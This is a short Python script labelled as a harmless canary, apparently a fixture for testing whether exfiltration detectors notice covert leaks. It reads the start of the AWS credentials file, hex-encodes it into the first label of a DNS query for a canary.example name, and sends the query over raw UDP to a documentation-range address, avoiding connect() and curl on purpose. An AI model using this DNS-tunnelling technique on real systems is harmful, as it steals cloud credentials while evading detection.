# HARMLESS CANARY: reads the fake credentials and "exfiltrates" them as the first label of a DNS
# question sent with sendto() on a raw UDP socket. No connect(), no curl: the only place the
# destination name appears is the packet body.
import os, socket, struct
secret = open(os.path.expanduser("~/.aws/credentials"), "rb").read(20).hex()   # <= 40 chars
labels = [secret, "canary", "example"]
q = struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
q += b"".join(bytes([len(l)]) + l.encode() for l in labels) + b"\0" + struct.pack("!HH", 1, 1)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(1)
try:
    s.sendto(q, ("198.51.100.7", 53))
except OSError:
    pass
